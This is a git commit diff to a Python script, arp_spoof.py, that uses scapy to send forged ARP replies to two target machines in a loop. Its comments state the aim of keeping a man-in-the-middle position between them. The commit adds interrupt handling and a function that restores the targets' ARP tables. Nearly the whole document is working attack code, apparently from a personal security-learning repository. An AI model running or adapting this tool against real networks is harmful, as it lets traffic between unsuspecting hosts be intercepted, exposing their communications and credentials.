d8e43c7628ca2b2f075b598aab3f6c4e66127c21
Joseph Merigala <104745031+13HJoe@users.noreply.github.com>
2024-07-25 20:23:40 +0530

    Updated script
    - Exception handling implemented for KeyBoardInterrupt
    - ARP table reset function to restore normal network operation
    - Store original MAC addresses of the targets statically in memory to prevent errors caused due to broadcast packets for ARP requests being ignored by target machines

--- ARP Spoofing/arp_spoof.py
+++ ARP Spoofing/arp_spoof.py
@@ -1,4 +1,3 @@
-
 import scapy.all as scapy
 from argparse import ArgumentParser
 import time
@@ -31,26 +30,47 @@ def get_mac(ip):
         exit(0)
     return response[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    #print(target_mac)
+def spoof(target_ip, target_mac, spoof_ip):
+    # op -> arp response
     packet = scapy.ARP(op=2, 
                     pdst=target_ip,
                     hwdst=target_mac,
-                    psrc=spoof_ip)
+                    psrc=spoof_ip) # scapy puts current machine MAC for HWSRC
     scapy.send(packet, verbose=False)
+
+def restore_net(src, dst):
+    packet =  scapy.ARP(op=2,
+                         pdst=dst,
+                         hwdst=get_mac(dst),
+                         psrc=src,
+                         hwsrc=get_mac(src))
+    scapy.send(packet, verbose=False)
+
+def run(t1, t2):
+    t1_mac = get_mac(t1)
+    t2_mac = get_mac(t2)
+    count = 0
+    while True:
+        spoof(t1, t1_mac, t2)
+        spoof(t2, t2_mac, t1)
+        # ARP tables are reset to original values during each HTTP req-resp cycle
+        # to maintain MITM persistence -> loop
+        print("\r[+] Packets sent ->", count, end='')
+        count+=2
+        # delay req to prevent network overload
+        time.sleep(2)
+
+
 
 #---MAIN---#
 res = get_args()
 
 t_ip1, t_ip2 = res.target_1, res.target_2
-count = 0
-while True:
-    # ARP tables are reset to original values during each HTTP req-resp cycle
-    # to maintain MITM persistence -> loop
-    spoof(t_ip1, t_ip2)
-    spoof(t_ip2, t_ip1)
-    print("\r[+] Packets sent ->", count, end='')
-    count+=2
-    # delay req to prevent network overload
-    time.sleep(2)
+try:
+    run(t_ip1, t_ip2)
+except KeyboardInterrupt:
+    print("\n[-] Script Interrupted by User ")
+    restore_net(t_ip1, t_ip2)
+    restore_net(t_ip2, t_ip1)
+    print("[-] ARP tables reset")
+    exit()
